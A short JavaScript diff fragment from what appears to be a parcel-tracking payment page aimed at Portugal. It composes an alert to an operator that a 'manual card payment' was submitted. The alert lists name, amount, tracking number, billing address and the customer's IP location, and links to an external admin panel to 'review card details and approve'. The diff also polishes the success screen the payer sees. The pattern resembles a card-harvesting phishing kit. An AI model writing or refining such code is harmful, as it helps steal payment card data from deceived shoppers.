+      message:`A manual card payment has been submitted.\n\nCustomer: ${holder}\nAmount: ${window._mpCurrency} ${fmt(payAmt)}${payingPartial?' (PARTIAL PAYMENT)':' (FULL PAYMENT)'}\nTracking #: ${currentTrackNum}\nBilling City: ${city}, ${country}\nPostal Code: ${postcode}\nCustomer IP Location: ${geo.countryName||'Portugal'} — ${geo.city||''}\n\nLog in to review card details and approve:\nhttps://feadmin-two.vercel.app`,
       trackNum:currentTrackNum,
       amount:window._mpCurrency+' '+fmt(payAmt),
       name:holder,
       country:geo.countryName||'Portugal',
       payType:'Manual Card Payment (Portugal)'
     });
-    // Show success
+
+    // Show success screen
     document.getElementById('mpBody').innerHTML=`
       <div class="mp-success">
         <div class="ms-icon">✅</div>
         <h3>${L.mpSuccessTitle}</h3>
         <p>${L.mpSuccessMsg}</p>
-        <button onclick="closeMpModal()" style="margin-top:16px;background:var(--blue);color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer">${lang==='pt'?'Fechar':'Close'}</button>
+        <button onclick="closeMpModal()" style="margin-top:20px;background:var(--blue);color:#fff;border:none;padding:12px 28px;border-radius:6px;font-size:15px;font-weight:700;cursor:pointer;width:100%">${lang==='pt'?'Fechar':'Close'}</button>
       </div>`;
+    document.getElementById('mpOverlay').scrollTop=0;
+
   }catch(e){
     document.getElementById('mpSubmitBtn').textContent=L.mpSubmitBtn;
     document.getElementById('mpSubmitBtn').disabled=false;
